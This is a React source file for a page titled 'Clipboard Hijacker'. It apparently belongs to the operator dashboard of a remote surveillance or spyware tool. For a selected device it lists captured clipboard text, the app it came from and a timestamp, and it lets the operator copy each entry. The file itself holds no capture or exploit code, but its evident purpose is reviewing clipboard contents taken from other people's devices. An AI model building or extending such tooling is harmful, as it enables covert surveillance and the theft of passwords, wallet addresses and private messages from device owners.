import { useEffect, useState } from 'react'
import { useParams } from 'react-router-dom'
import PageHeader from '../components/PageHeader'
import DataTable from '../components/DataTable'
import { clipboard } from '../utils/api'
import { Clipboard, Copy } from 'lucide-react'

export default function ClipboardPage() {
  const { deviceId } = useParams()
  const [logs, setLogs] = useState([])

  useEffect(() => { if (deviceId) loadLogs() }, [deviceId])

  const loadLogs = async () => {
    const data = await clipboard.list(deviceId)
    if (data) setLogs(data)
  }

  const columns = [
    { key: 'text', label: 'Content', render: (row) => (
      <span className="font-mono text-sm text-wuzen-text truncate max-w-[500px] block">{row.text}</span>
    )},
    { key: 'app_source', label: 'Source App', render: (row) => (
      <span className="text-xs px-2 py-0.5 rounded bg-wuzen-primary/10 text-wuzen-primary">{row.app_source || 'Unknown'}</span>
    )},
    { key: 'timestamp', label: 'Time', render: (row) => (
      <span className="text-xs font-mono">{new Date(row.timestamp).toLocaleString()}</span>
    )},
    { key: 'actions', label: '', render: (row) => (
      <button onClick={() => navigator.clipboard.writeText(row.text)} className="p-1 rounded hover:bg-wuzen-card text-wuzen-primary">
        <Copy className="w-4 h-4" />
      </button>
    )}
  ]

  return (
    <div className="animate-fade-in">
      <PageHeader title="Clipboard Hijacker" icon={Clipboard} onDeviceChange={() => {}} />
      <DataTable columns={columns} data={logs} keyField="id" searchable />
    </div>
  )
}
